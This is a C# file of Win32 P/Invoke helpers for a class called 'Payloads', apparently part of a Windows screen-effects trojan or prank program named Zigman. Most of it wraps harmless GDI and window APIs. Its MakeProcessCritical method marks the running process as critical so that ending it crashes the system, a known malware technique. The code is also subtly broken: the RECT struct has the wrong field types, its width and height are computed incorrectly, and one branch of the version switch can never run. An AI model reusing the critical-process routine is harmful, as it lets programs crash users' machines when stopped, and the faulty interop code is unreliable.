// Copyright © TheAirBlow 2022 <theairblow.help@gmail.com>
// This Source Code Form is subject to the terms of the Mozilla Public
// License, v2.0. If a copy of the MPL was not distributed with this
// file, You can obtain one at http://mozilla.org/MPL/2.0/.

using System.Diagnostics;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Security.Principal;

namespace TheAirBlow.Zigman;

/// <summary>
/// Additional Win32 API P/Invokes
/// that are missing in the PInvokes
/// </summary>
public partial class Payloads
{
    [DllImport("gdi32.dll")]
    public static extern bool Rectangle(IntPtr hdc, int nLeftRect, int nTopRect, int nRightRect, int nBottomRect);
    
    [StructLayout(LayoutKind.Sequential)]
    public struct POINT
    {
        public int X;
        public int Y;

        public POINT(int x, int y)
        {
            this.X = x;
            this.Y = y;
        }

        public static implicit operator System.Drawing.Point(POINT p)
        {
            return new System.Drawing.Point(p.X, p.Y);
        }

        public static implicit operator POINT(System.Drawing.Point p)
        {
            return new POINT(p.X, p.Y);
        }
    }

    
    [DllImport("gdi32.dll")]
    public static extern bool PlgBlt(IntPtr hdcDest, POINT[] lpPoint, IntPtr hdcSrc,
        int nXSrc, int nYSrc, int nWidth, int nHeight, IntPtr hbmMask, int xMask,
        int yMask);
    
    [DllImport("gdi32.dll", EntryPoint = "CreateCompatibleBitmap")]
    public static extern IntPtr CreateCompatibleBitmap([In] IntPtr hdc, int nWidth, int nHeight);
    
    [DllImport("gdi32.dll", EntryPoint = "DeleteObject")]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool DeleteObject([In] IntPtr hObject);
    
    [DllImport("gdi32.dll", EntryPoint = "SelectObject")]
    public static extern IntPtr SelectObject([In] IntPtr hdc, [In] IntPtr hgdiobj);

    [DllImport("gdi32.dll", EntryPoint = "CreateCompatibleDC", SetLastError=true)]
    public static extern IntPtr CreateCompatibleDC([In] IntPtr hdc);
    
    [DllImport("gdi32.dll")]
    public static extern IntPtr CreateSolidBrush(uint crColor);

    [DllImport("gdi32.dll", EntryPoint="GdiAlphaBlend")]
    public static extern bool AlphaBlend(IntPtr hdcDest, int nXOriginDest, int nYOriginDest,
        int nWidthDest, int nHeightDest,
        IntPtr hdcSrc, int nXOriginSrc, int nYOriginSrc, int nWidthSrc, int nHeightSrc,
        BLENDFUNCTION blendFunction);
    
    [StructLayout(LayoutKind.Sequential)]
    public struct BLENDFUNCTION
    {
        byte BlendOp;
        byte BlendFlags;
        byte SourceConstantAlpha;
        byte AlphaFormat;

        public BLENDFUNCTION(byte op, byte flags, byte alpha, byte format)
        {
            BlendOp = op;
            BlendFlags = flags;
            SourceConstantAlpha = alpha;
            AlphaFormat = format;
        }
    }
    
    public const int AC_SRC_OVER = 0x00;
    public const int AC_SRC_ALPHA = 0x01;
    
    /// <summary>
    /// Get display device
    /// </summary>
    /// <param name="lpszDriver">Driver</param>
    /// <param name="lpszDevice">Device</param>
    /// <param name="lpszOutput">Output</param>
    /// <param name="lpInitData">Init Data</param>
    /// <returns>Display handle</returns>
    [DllImport("gdi32.dll")]
    public static extern IntPtr CreateDC(string lpszDriver = "DISPLAY", string lpszDevice = null!, string lpszOutput = null!, string lpInitData = null!);
    
    [DllImport("ntdll.dll", SetLastError = true)]
    private static extern void RtlSetProcessIsCritical(int newValue, out int oldValue, int checkFlag = 0);

    [DllImport("ntdll.dll", SetLastError = true)]
    private static extern void NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);

    /// <summary>
    /// Make current process critical
    /// </summary>
    /// <exception cref="Exception">Unsupported windows version</exception>
    public static void MakeProcessCritical()
    {
        Process.EnterDebugMode();
        switch (Environment.OSVersion.Version.Major) {
            case >= 6 when Environment.OSVersion.Version.Minor >= 1:
                var info = 1;
                NtSetInformationProcess(Process.GetCurrentProcess().Handle, 0x1D, ref info, 
                    sizeof(int));
                break;
            case >= 6 when Environment.OSVersion.Version.Minor >= 2:
                RtlSetProcessIsCritical(1, out _);
                break;
            case > 6:
                RtlSetProcessIsCritical(1, out _);
                break;
            default:
                throw new Exception("Unsupported windows version!");
        }
    }
    
    [Flags]
    public enum WindowStylesEx : uint
    {
        /// <summary>Specifies a window that accepts drag-drop files.</summary>
        AcceptFiles = 0x00000010,

        /// <summary>Forces a top-level window onto the taskbar when the window is visible.</summary>
        AppWindow = 0x00040000,

        /// <summary>Specifies a window that has a border with a sunken edge.</summary>
        ClientEdge = 0x00000200,

        /// <summary>
        /// Specifies a window that paints all descendants in bottom-to-top painting order using double-buffering.
        /// This cannot be used if the window has a class style of either CS_OWNDC or CS_CLASSDC. This style is not supported in Windows 2000.
        /// </summary>
        /// <remarks>
        /// With WS_EX_COMPOSITED set, all descendants of a window get bottom-to-top painting order using double-buffering.
        /// Bottom-to-top painting order allows a descendent window to have translucency (alpha) and transparency (color-key) effects,
        /// but only if the descendent window also has the WS_EX_TRANSPARENT bit set.
        /// Double-buffering allows the window and its descendents to be painted without flicker.
        /// </remarks>
        Composited = 0x02000000,

        /// <summary>
        /// Specifies a window that includes a question mark in the title bar. When the user clicks the question mark,
        /// the cursor changes to a question mark with a pointer. If the user then clicks a child window, the child receives a WM_HELP message.
        /// The child window should pass the message to the parent window procedure, which should call the WinHelp function using the HELP_WM_HELP command.
        /// The Help application displays a pop-up window that typically contains help for the child window.
        /// WS_EX_CONTEXTHELP cannot be used with the WS_MAXIMIZEBOX or WS_MINIMIZEBOX styles.
        /// </summary>
        ContextHelp = 0x00000400,

        /// <summary>
        /// Specifies a window which contains child windows that should take part in dialog box navigation.
        /// If this style is specified, the dialog manager recurses into children of this window when performing navigation operations
        /// such as handling the TAB key, an arrow key, or a keyboard mnemonic.
        /// </summary>
        ControlParent = 0x00010000,

        /// <summary>Specifies a window that has a double border.</summary>
        DlgModalFrame = 0x00000001,

        /// <summary>
        /// Specifies a window that is a layered window.
        /// This cannot be used for child windows or if the window has a class style of either CS_OWNDC or CS_CLASSDC.
        /// </summary>
        Layered = 0x00080000,

        /// <summary>
        /// Specifies a window with the horizontal origin on the right edge. Increasing horizontal values advance to the left.
        /// The shell language must support reading-order alignment for this to take effect.
        /// </summary>
        LayoutRtl = 0x00400000,

        /// <summary>Specifies a window that has generic left-aligned properties. This is the default.</summary>
        Left = 0x00000000,

        /// <summary>
        /// Specifies a window with the vertical scroll bar (if present) to the left of the client area.
        /// The shell language must support reading-order alignment for this to take effect.
        /// </summary>
        LeftScrollBar = 0x00004000,

        /// <summary>
        /// Specifies a window that displays text using left-to-right reading-order properties. This is the default.
        /// </summary>
        LtrReading = 0x00000000,

        /// <summary>
        /// Specifies a multiple-document interface (MDI) child window.
        /// </summary>
        MdiChild = 0x00000040,

        /// <summary>
        /// Specifies a top-level window created with this style does not become the foreground window when the user clicks it.
        /// The system does not bring this window to the foreground when the user minimizes or closes the foreground window.
        /// The window does not appear on the taskbar by default. To force the window to appear on the taskbar, use the WS_EX_APPWINDOW style.
        /// To activate the window, use the SetActiveWindow or SetForegroundWindow function.
        /// </summary>
        NoActivate = 0x08000000,

        /// <summary>
        /// Specifies a window which does not pass its window layout to its child windows.
        /// </summary>
        NoInheritLayout = 0x00100000,

        /// <summary>
        /// Specifies that a child window created with this style does not send the WM_PARENTNOTIFY message to its parent window when it is created or destroyed.
        /// </summary>
        NoParentNotify = 0x00000004,

        /// <summary>
        /// The window does not render to a redirection surface.
        /// This is for windows that do not have visible content or that use mechanisms other than surfaces to provide their visual.
        /// </summary>
        NoRedirectionBitmap = 0x00200000,

        /// <summary>Specifies an overlapped window.</summary>
        OverlappedWindow = WindowsEdge | ClientEdge,

        /// <summary>Specifies a palette window, which is a modeless dialog box that presents an array of commands.</summary>
        PalleteWindow = WindowsEdge | ToolWindow | TopMost,

        /// <summary>
        /// Specifies a window that has generic "right-aligned" properties. This depends on the window class.
        /// The shell language must support reading-order alignment for this to take effect.
        /// Using the WS_EX_RIGHT style has the same effect as using the SS_RIGHT (static), ES_RIGHT (edit), and BS_RIGHT/BS_RIGHTBUTTON (button) control styles.
        /// </summary>
        Right = 0x00001000,

        /// <summary>Specifies a window with the vertical scroll bar (if present) to the right of the client area. This is the default.</summary>
        RightScrollBar = 0x00000000,

        /// <summary>
        /// Specifies a window that displays text using right-to-left reading-order properties.
        /// The shell language must support reading-order alignment for this to take effect.
        /// </summary>
        RtlReading = 0x00002000,

        /// <summary>Specifies a window with a three-dimensional border style intended to be used for items that do not accept user input.</summary>
        StaticEdge = 0x00020000,

        /// <summary>
        /// Specifies a window that is intended to be used as a floating toolbar.
        /// A tool window has a title bar that is shorter than a normal title bar, and the window title is drawn using a smaller font.
        /// A tool window does not appear in the taskbar or in the dialog that appears when the user presses ALT+TAB.
        /// If a tool window has a system menu, its icon is not displayed on the title bar.
        /// However, you can display the system menu by right-clicking or by typing ALT+SPACE.
        /// </summary>
        ToolWindow = 0x00000080,

        /// <summary>
        /// Specifies a window that should be placed above all non-topmost windows and should stay above them, even when the window is deactivated.
        /// To add or remove this style, use the SetWindowPos function.
        /// </summary>
        TopMost = 0x00000008,

        /// <summary>
        /// Specifies a window that should not be painted until siblings beneath the window (that were created by the same thread) have been painted.
        /// The window appears transparent because the bits of underlying sibling windows have already been painted.
        /// To achieve transparency without these restrictions, use the SetWindowRgn function.
        /// </summary>
        Transparent = 0x00000020,

        /// <summary>Specifies a window that has a border with a raised edge.</summary>
        WindowsEdge = 0x00000100
    }
    
    /// <summary>
    /// Window Styles.
    /// The following styles can be specified wherever a window style is required. After the control has been created, these styles cannot be modified, except as noted.
    /// </summary>
    [Flags]
    public enum WindowStyles : uint
    {
        /// <summary>The window has a thin-line border.</summary>
        Border = 0x800000,

        /// <summary>The window has a title bar (includes the WS_BORDER style).</summary>
        Caption = 0xc00000,

        /// <summary>The window is a child window. A window with this style cannot have a menu bar. This style cannot be used with the WS_POPUP style.</summary>
        Child = 0x40000000,

        /// <summary>Excludes the area occupied by child windows when drawing occurs within the parent window. This style is used when creating the parent window.</summary>
        ClipChildren = 0x2000000,

        /// <summary>
        /// Clips child windows relative to each other; that is, when a particular child window receives a WM_PAINT message, the WS_CLIPSIBLINGS style clips all other overlapping child windows out of the region of the child window to be updated.
        /// If WS_CLIPSIBLINGS is not specified and child windows overlap, it is possible, when drawing within the client area of a child window, to draw within the client area of a neighboring child window.
        /// </summary>
        ClipSiblings = 0x4000000,

        /// <summary>The window is initially disabled. A disabled window cannot receive input from the user. To change this after a window has been created, use the EnableWindow function.</summary>
        Disabled = 0x8000000,

        /// <summary>The window has a border of a style typically used with dialog boxes. A window with this style cannot have a title bar.</summary>
        DlgFrame = 0x400000,

        /// <summary>
        /// The window is the first control of a group of controls. The group consists of this first control and all controls defined after it, up to the next control with the WS_GROUP style.
        /// The first control in each group usually has the WS_TABSTOP style so that the user can move from group to group. The user can subsequently change the keyboard focus from one control in the group to the next control in the group by using the direction keys.
        /// You can turn this style on and off to change dialog box navigation. To change this style after a window has been created, use the SetWindowLong function.
        /// </summary>
        Group = 0x20000,

        /// <summary>The window has a horizontal scroll bar.</summary>
        HorizontalScroll = 0x100000,

        /// <summary>The window is initially maximized.</summary>
        Maximize = 0x1000000,

        /// <summary>The window has a maximize button. Cannot be combined with the WS_EX_CONTEXTHELP style. The WS_SYSMENU style must also be specified.</summary>
        MaximizeBox = 0x10000,

        /// <summary>The window is initially minimized.</summary>
        Minimize = 0x20000000,

        /// <summary>The window has a minimize button. Cannot be combined with the WS_EX_CONTEXTHELP style. The WS_SYSMENU style must also be specified.</summary>
        MinimizeBox = 0x20000,

        /// <summary>The window is an overlapped window. An overlapped window has a title bar and a border.</summary>
        Overlapped = 0x0,

        /// <summary>The window is an overlapped window.</summary>
        OverlappedWindow = Overlapped | Caption | SysMenu | SizeFrame | MinimizeBox | MaximizeBox,

        /// <summary>The window is a pop-up window. This style cannot be used with the WS_CHILD style.</summary>
        Popup = 0x80000000u,

        /// <summary>The window is a pop-up window. The WS_CAPTION and WS_POPUPWINDOW styles must be combined to make the window menu visible.</summary>
        Popupwindow = Popup | Border | SysMenu,

        /// <summary>The window has a sizing border.</summary>
        SizeFrame = 0x40000,

        /// <summary>The window has a window menu on its title bar. The WS_CAPTION style must also be specified.</summary>
        SysMenu = 0x80000,

        /// <summary>
        /// The window is a control that can receive the keyboard focus when the user presses the TAB key.
        /// Pressing the TAB key changes the keyboard focus to the next control with the WS_TABSTOP style.  
        /// You can turn this style on and off to change dialog box navigation. To change this style after a window has been created, use the SetWindowLong function.
        /// For user-created windows and modeless dialogs to work with tab stops, alter the message loop to call the IsDialogMessage function.
        /// </summary>
        TabStop = 0x10000,

        /// <summary>The window is initially visible. This style can be turned on and off by using the ShowWindow or SetWindowPos function.</summary>
        Visible = 0x10000000,

        /// <summary>The window has a vertical scroll bar.</summary>
        VerticalScrollbar = 0x200000
    }

    /// <summary>
    /// The CreateWindowEx function creates an overlapped, pop-up, or child window with an extended window style; otherwise, this function is identical to the CreateWindow function.
    /// </summary>
    /// <param name="dwExStyle">Specifies the extended window style of the window being created.</param>
    /// <param name="lpClassName">Pointer to a null-terminated string or a class atom created by a previous call to the RegisterClass or RegisterClassEx function. The atom must be in the low-order word of lpClassName; the high-order word must be zero. If lpClassName is a string, it specifies the window class name. The class name can be any name registered with RegisterClass or RegisterClassEx, provided that the module that registers the class is also the module that creates the window. The class name can also be any of the predefined system class names.</param>
    /// <param name="lpWindowName">Pointer to a null-terminated string that specifies the window name. If the window style specifies a title bar, the window title pointed to by lpWindowName is displayed in the title bar. When using CreateWindow to create controls, such as buttons, check boxes, and static controls, use lpWindowName to specify the text of the control. When creating a static control with the SS_ICON style, use lpWindowName to specify the icon name or identifier. To specify an identifier, use the syntax "#num". </param>
    /// <param name="dwStyle">Specifies the style of the window being created. This parameter can be a combination of window styles, plus the control styles indicated in the Remarks section.</param>
    /// <param name="x">Specifies the initial horizontal position of the window. For an overlapped or pop-up window, the x parameter is the initial x-coordinate of the window's upper-left corner, in screen coordinates. For a child window, x is the x-coordinate of the upper-left corner of the window relative to the upper-left corner of the parent window's client area. If x is set to CW_USEDEFAULT, the system selects the default position for the window's upper-left corner and ignores the y parameter. CW_USEDEFAULT is valid only for overlapped windows; if it is specified for a pop-up or child window, the x and y parameters are set to zero.</param>
    /// <param name="y">Specifies the initial vertical position of the window. For an overlapped or pop-up window, the y parameter is the initial y-coordinate of the window's upper-left corner, in screen coordinates. For a child window, y is the initial y-coordinate of the upper-left corner of the child window relative to the upper-left corner of the parent window's client area. For a list box y is the initial y-coordinate of the upper-left corner of the list box's client area relative to the upper-left corner of the parent window's client area.
    /// <para>If an overlapped window is created with the WS_VISIBLE style bit set and the x parameter is set to CW_USEDEFAULT, then the y parameter determines how the window is shown. If the y parameter is CW_USEDEFAULT, then the window manager calls ShowWindow with the SW_SHOW flag after the window has been created. If the y parameter is some other value, then the window manager calls ShowWindow with that value as the nCmdShow parameter.</para></param>
    /// <param name="nWidth">Specifies the width, in device units, of the window. For overlapped windows, nWidth is the window's width, in screen coordinates, or CW_USEDEFAULT. If nWidth is CW_USEDEFAULT, the system selects a default width and height for the window; the default width extends from the initial x-coordinates to the right edge of the screen; the default height extends from the initial y-coordinate to the top of the icon area. CW_USEDEFAULT is valid only for overlapped windows; if CW_USEDEFAULT is specified for a pop-up or child window, the nWidth and nHeight parameter are set to zero.</param>
    /// <param name="nHeight">Specifies the height, in device units, of the window. For overlapped windows, nHeight is the window's height, in screen coordinates. If the nWidth parameter is set to CW_USEDEFAULT, the system ignores nHeight.</param> <param name="hWndParent">Handle to the parent or owner window of the window being created. To create a child window or an owned window, supply a valid window handle. This parameter is optional for pop-up windows.
    /// <para>Windows 2000/XP: To create a message-only window, supply HWND_MESSAGE or a handle to an existing message-only window.</para></param>
    /// <param name="hMenu">Handle to a menu, or specifies a child-window identifier, depending on the window style. For an overlapped or pop-up window, hMenu identifies the menu to be used with the window; it can be NULL if the class menu is to be used. For a child window, hMenu specifies the child-window identifier, an integer value used by a dialog box control to notify its parent about events. The application determines the child-window identifier; it must be unique for all child windows with the same parent window.</param>
    /// <param name="hInstance">Handle to the instance of the module to be associated with the window.</param> <param name="lpParam">Pointer to a value to be passed to the window through the CREATESTRUCT structure (lpCreateParams member) pointed to by the lParam param of the WM_CREATE message. This message is sent to the created window by this function before it returns.
    /// <para>If an application calls CreateWindow to create a MDI client window, lpParam should point to a CLIENTCREATESTRUCT structure. If an MDI client window calls CreateWindow to create an MDI child window, lpParam should point to a MDICREATESTRUCT structure. lpParam may be NULL if no additional data is needed.</para></param>
    /// <returns>If the function succeeds, the return value is a handle to the new window.
    /// <para>If the function fails, the return value is NULL. To get extended error information, call GetLastError.</para>
    /// <para>This function typically fails for one of the following reasons:</para>
    /// <list type="">
    /// <item>an invalid parameter value</item>
    /// <item>the system class was registered by a different module</item>
    /// <item>The WH_CBT hook is installed and returns a failure code</item>
    /// <item>if one of the controls in the dialog template is not registered, or its window window procedure fails WM_CREATE or WM_NCCREATE</item>
    /// </list></returns>
    [DllImport("user32.dll", SetLastError=true)]
    public static extern IntPtr CreateWindowEx(
        WindowStylesEx dwExStyle,
        string lpClassName,
        string lpWindowName,
        WindowStyles dwStyle,
        int x,
        int y,
        int nWidth,
        int nHeight,
        IntPtr hWndParent,
        IntPtr hMenu,
        IntPtr hInstance,
        IntPtr lpParam);
    
    /// <summary>
    /// Register a WNDCLASSEX
    /// </summary>
    /// <param name="lpwcx">WINCLASSEX</param>
    /// <returns>Success or not</returns>
    [DllImport("user32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.U2)]
    static extern short RegisterClassEx([In] ref WndClassEx lpwcx);
    
    /// <summary>
    /// WIN32 WNDCLASSEX
    /// </summary>
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
    public struct WndClassEx
    {
        [MarshalAs(UnmanagedType.U4)]
        public int cbSize = Marshal.SizeOf(typeof(WndClassEx));
        [MarshalAs(UnmanagedType.U4)]
        public int style;
        public IntPtr lpfnWndProc; // not WndProc
        public int cbClsExtra;
        public int cbWndExtra;
        public IntPtr hInstance;
        public IntPtr hIcon;
        public IntPtr hCursor;
        public IntPtr hbrBackground;
        public string lpszMenuName;
        public string lpszClassName;
        public IntPtr hIconSm;
    }

    /// <summary>
    /// WIN32 RECT
    /// </summary>
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
    public struct WinRectangle
    {
        long left;
        long top;
        long right;
        long bottom;

        public Rectangle ToRectangle()
            => new Rectangle((int)left, (int)top, (int)bottom - (int)left, (int)top - (int)right);

        public WinRectangle(Rectangle rect)
        {
            left = rect.X;
            top = rect.Y;
            right = rect.X + rect.Width;
            bottom = rect.Y + rect.Height;
        }
    }

    /// <summary>
    /// Get window rectangle
    /// </summary>
    /// <param name="hWnd">Window handle</param>
    /// <param name="lpRect">Rectangle</param>
    /// <returns>Success or not</returns>
    [return: MarshalAs(UnmanagedType.Bool)]
    [DllImport("user32.dll", SetLastError = true)]
    public static extern bool GetWindowRect(IntPtr hWnd, out WinRectangle lpRect);
    
    /// <summary>
    /// Is the current process running a admin
    /// </summary>
    /// <returns>Boolean</returns>
    public static bool IsAdministrator()
    {
        bool isAdmin;
        try {
            var user = WindowsIdentity.GetCurrent();
            var principal = new WindowsPrincipal(user);
            isAdmin = principal.IsInRole(WindowsBuiltInRole.Administrator);
        } catch { isAdmin = false; }
        return isAdmin;
    }

    /// <summary>
    /// Make current process DPI aware
    /// </summary>
    /// <returns></returns>
    [DllImport("user32.dll")]
    public static extern bool SetProcessDPIAware();

    /// <summary>
    /// Most common raster operation codes
    /// </summary>
    public enum RasterOperation : ulong
    {
        /// <summary>
        /// Fills the destination rectangle using the color
        /// associated with index 0 in the physical palette.
        /// (This color is black for the default physical palette.) 
        /// </summary>
        Blackness = 0x42,
        
        /// <summary>
        /// Fills the destination rectangle using the color
        /// associated with index 1 in the physical palette.
        /// (This color is white for the default physical palette.) 
        /// </summary>
        Whiteness = 0xFF0062,
        
        /// <summary>
        /// Combines the colors of the source and destination
        /// rectangles by using the Boolean OR operator
        /// and then inverts the resultant color. 
        /// </summary>
        NotSrcErase = 0x1100A6,
        
        /// <summary>
        /// Copies the inverted source rectangle to the destination. 
        /// </summary>
        NotSrcCopy = 0x330008,
        
        /// <summary>
        /// Combines the inverted colors of the destination rectangle
        /// with the colors of the source rectangle by using
        /// the Boolean AND operator. 
        /// </summary>
        SrcErase = 0x440328,
        
        /// <summary>
        /// Inverts the destination rectangle. 
        /// </summary>
        DstInvert = 0x550009,
        
        /// <summary>
        /// Combines the colors of the brush currently selected in hdcDest,
        /// with the colors of the destination rectangle by using
        /// the Boolean XOR operator. 
        /// </summary>
        PatInvert = 0x5A0049,
        
        /// <summary>
        /// Combines the colors of the source and destination rectangles
        /// by using the Boolean XOR operator. 
        /// </summary>
        SrcInvert = 0x660046,
        
        /// <summary>
        /// Combines the colors of the source and destination rectangles
        /// by using the Boolean AND operator. 
        /// </summary>
        SrcAnd = 0x8800C6,
        
        /// <summary>
        /// Combines the colors of the source and destination rectangles
        /// by using the Boolean OR operator. 
        /// </summary>
        MergePaint = 0xBB0226,
        
        /// <summary>
        /// Merges the colors of the source rectangle with the brush
        /// currently selected in hdcDest, by using
        /// the Boolean AND operator. 
        /// </summary>
        MergeCopy = 0xC000CA,
        
        /// <summary>
        /// Copies the source rectangle directly to the destination rectangle. 
        /// </summary>
        SrcCopy = 0xCC0020,
        
        /// <summary>
        /// Combines the colors of the source and destination
        /// rectangles by using the Boolean OR operator. 
        /// </summary>
        SrcPaint = 0xEE0086,
        
        /// <summary>
        /// Copies the brush currently selected in hdcDest,
        /// into the destination bitmap. 
        /// </summary>
        PatCopy = 0xF00021,
        
        /// <summary>
        /// Combines the colors of the brush currently selected
        /// in hdcDest, with the colors of the inverted source
        /// rectangle by using the Boolean OR operator.
        /// The result of this operation is combined with
        /// the colors of the destination rectangle by using
        /// the Boolean OR operator. 
        /// </summary>
        PatPaint = 0xFB0A09
    }
    
    /// <summary>
    /// Stretch
    /// </summary>
    /// <param name="hdcDest">Destination</param>
    /// <param name="xDest">Destination X</param>
    /// <param name="yDest">Destination Y</param>
    /// <param name="wDest">Destination width</param>
    /// <param name="hDest">Destination height</param>
    /// <param name="hdcSrc">Source</param>
    /// <param name="xSrc">Source X</param>
    /// <param name="ySrc">Source Y</param>
    /// <param name="wSrc">Source width</param>
    /// <param name="hSrc">Source height</param>
    /// <param name="rop">Raster operation codes</param>
    /// <returns>Success or not</returns>
    [return: MarshalAs(UnmanagedType.Bool)]
    [DllImport("gdi32.dll")]
    public static extern bool StretchBlt(IntPtr hdcDest, int xDest, int yDest, int wDest, int hDest, 
        IntPtr hdcSrc, int xSrc, int ySrc, int wSrc, int hSrc, int rop);
    
    /// <summary>
    /// Stretch
    /// </summary>
    /// <param name="hdcDest">Destination</param>
    /// <param name="xDest">Destination X</param>
    /// <param name="yDest">Destination Y</param>
    /// <param name="wDest">Destination width</param>
    /// <param name="hDest">Destination height</param>
    /// <param name="hdcSrc">Source</param>
    /// <param name="xSrc">Source X</param>
    /// <param name="ySrc">Source Y</param>
    /// <param name="wSrc">Source width</param>
    /// <param name="hSrc">Source height</param>
    /// <param name="rop">Raster operation codes</param>
    /// <returns>Success or not</returns>
    [return: MarshalAs(UnmanagedType.Bool)]
    [DllImport("gdi32.dll")]
    public static extern bool StretchBlt(IntPtr hdcDest, int xDest, int yDest, int wDest, int hDest, 
        IntPtr hdcSrc, int xSrc, int ySrc, int wSrc, int hSrc, RasterOperation rop);
    
    /// <summary>
    /// Get system metrics
    /// </summary>
    /// <param name="smIndex">Index</param>
    /// <returns>Value</returns>
    [DllImport("user32.dll")]
    public static extern int GetSystemMetrics(int smIndex);

    /// <summary>
    /// Screen width
    /// </summary>
    public static readonly int Width = GetSystemMetrics(0);
    
    /// <summary>
    /// Screen height
    /// </summary>
    public static readonly int Height = GetSystemMetrics(1);

    /// <summary>
    /// Load an icon
    /// </summary>
    /// <param name="hInstance">Instance</param>
    /// <param name="lpIconName">Icon ID</param>
    /// <returns>Icon pointer</returns>
    [DllImport("user32.dll")]
    public static extern IntPtr LoadIcon(IntPtr hInstance, int lpIconName);

    /// <summary>
    /// Get foreground window
    /// </summary>
    /// <returns>Window handle</returns>
    [DllImport("user32.dll")] 
    public static extern IntPtr GetForegroundWindow();

    /// <summary>
    /// SetWindowPos "hWndInsertAfter", should be converted to IntPtr
    /// </summary>
    public enum ZOrder
    {
        /// <summary>
        /// Places the window at the top of the Z order. 
        /// </summary>
        Top = 0,
        
        /// <summary>
        /// Places the window at the bottom of the Z order.
        /// If the hWnd parameter identifies a topmost window,
        /// the window loses its topmost status and is placed
        /// at the bottom of all other windows. 
        /// </summary>
        Bottom = 1,
        
        /// <summary>
        /// Places the window above all non-topmost windows.
        /// The window maintains its topmost position even when it is deactivated. 
        /// </summary>
        TopMost = -1,
        
        /// <summary>
        /// Places the window above all non-topmost windows
        /// (that is, behind all topmost windows).
        /// This flag has no effect if the window
        /// is already a non-topmost window.
        /// </summary>
        NoTopMost = -2
    }

    /// <summary>
    /// SetWindowPos flags
    /// </summary>
    [Flags]
    public enum SetWindowPosFlags : uint
    {
        /// <summary>
        /// Hides the window.
        /// </summary>
        Hide = 0x0080,
        
        /// <summary>
        /// Shows the window
        /// </summary>
        Show = 0x0040,
        
        /// <summary>
        /// Does not activate the window. If this flag is not set,
        /// the window is activated and moved to the top of either
        /// the topmost or non-topmost group (depending on the
        /// setting of the hWndInsertAfter parameter).
        /// </summary>
        NoActivate = 0x0010,
        
        /// <summary>
        /// Ignores X and Y parameters.
        /// </summary>
        DoNotMove = 0x0002,

        /// <summary>
        /// Does not redraw changes. If this flag is set, no repainting of any kind occurs.
        /// This applies to the client area, the nonclient area (including the title bar
        /// and scroll bars), and any part of the parent window uncovered as a result
        /// of the window being moved. When this flag is set, the application must
        /// explicitly invalidate or redraw any parts of the window and parent window
        /// that need redrawing. 
        /// </summary>
        DoNotRepaint = 0x0008,
        
        /// <summary>
        /// Prevents the window from receiving the WM_WINDOWPOSCHANGING message. 
        /// </summary>
        DoNotInform = 0x0400,
        
        /// <summary>
        /// Ignores width and height parameters.
        /// </summary>
        DoNotResize = 0x0001,
        
        /// <summary>
        /// Ignores Z order flags.
        /// </summary>
        DoNotChangeZOrder = 0x0004
    }
    
    /// <summary>
    /// Set window position
    /// </summary>
    /// <param name="hWnd">Window handle</param>
    /// <param name="hWndInsertAfter">Z order</param>
    /// <param name="x">Position X</param>
    /// <param name="y">Position Y</param>
    /// <param name="cx">New width</param>
    /// <param name="cy">New height</param>
    /// <param name="uFlags">Flags</param>
    /// <returns>Success or not</returns>
    [return: MarshalAs(UnmanagedType.Bool)]
    [DllImport("user32.dll", SetLastError = true)]
    public static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int x, int y, int cx, int cy, uint uFlags);

    /// <summary>
    /// Draws an icon
    /// </summary>
    /// <param name="hdc">Window handler</param>
    /// <param name="xLeft">Position Y</param>
    /// <param name="yTop">Position X</param>
    /// <param name="hIcon">Icon pointer</param>
    /// <returns>Success or not</returns>
    [return: MarshalAs(UnmanagedType.Bool)]
    [DllImport("user32.dll")]
    public static extern bool DrawIcon(IntPtr hdc, int xLeft, int yTop, IntPtr hIcon);

    /// <summary>
    /// Screen point
    /// </summary>
    [StructLayout(LayoutKind.Sequential)]
    public struct Point
    {
        public int x;
        public int y;
    }
    
    /// <summary>
    /// Get cursor position
    /// </summary>
    /// <param name="lpPoint">Point</param>
    /// <returns>Success or not</returns>
    [return: MarshalAs(UnmanagedType.Bool)]
    [DllImport("user32")]
    public static extern bool GetCursorPos(out Point lpPoint);

    /// <summary>
    /// Play a Windows sound
    /// </summary>
    /// <param name="type">Sound type</param>
    /// <returns>Success or not</returns>
    [return: MarshalAs(UnmanagedType.Bool)]
    [DllImport("user32.dll")]
    public static extern bool MessageBeep(uint type);
    
    /// <summary>
    /// Get console window
    /// </summary>
    /// <returns>Window</returns>
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetConsoleWindow();

    /// <summary>
    /// Show/hide window
    /// </summary>
    /// <param name="hWnd">Window handle</param>
    /// <param name="nCmdShow">Command (0 - hide, 1 - show)</param>
    /// <returns>Success or not</returns>
    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    /// <summary>
    /// Get module handle
    /// </summary>
    /// <param name="lpModuleName">Module name</param>
    /// <returns>Handle</returns>
    [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
    public static extern IntPtr GetModuleHandle(string lpModuleName);
    
    /// <summary>
    /// Play a beep sound
    /// </summary>
    /// <param name="dwFreq">Frequency</param>
    /// <param name="dwDuration">Duration</param>
    /// <returns></returns>
    [return: MarshalAs(UnmanagedType.Bool)]
    [DllImport("kernel32.dll")]
    public static extern bool Beep(long dwFreq, long dwDuration);

    /// <summary>
    /// EnumWindows or EnumChildWindows delegate
    /// </summary>
    public delegate bool EnumDesktopWindowsDelegate(IntPtr hWnd, int lParam);

    /// <summary>
    /// Enumerate every window in a display handle
    /// </summary>
    /// <param name="i">Delegate</param>
    /// <param name="x">Display handle</param>
    /// <returns>Success or not</returns>
    [return: MarshalAs(UnmanagedType.Bool)]
    [DllImport("user32.dll")]
    public static extern bool EnumWindows(EnumDesktopWindowsDelegate i, IntPtr x);
 
    /// <summary>
    /// Enumerate every child window in a window in a display handle
    /// </summary>
    /// <param name="hwnd">Window handle</param>
    /// <param name="i">Delegate</param>
    /// <param name="x">Display handle</param>
    /// <returns>Success or not</returns>
    [return: MarshalAs(UnmanagedType.Bool)]
    [DllImport("user32.dll")]
    public static extern bool EnumChildWindows(IntPtr hwnd, EnumDesktopWindowsDelegate i, IntPtr x);

    /// <summary>
    /// Set window handle's text (title or it's content)
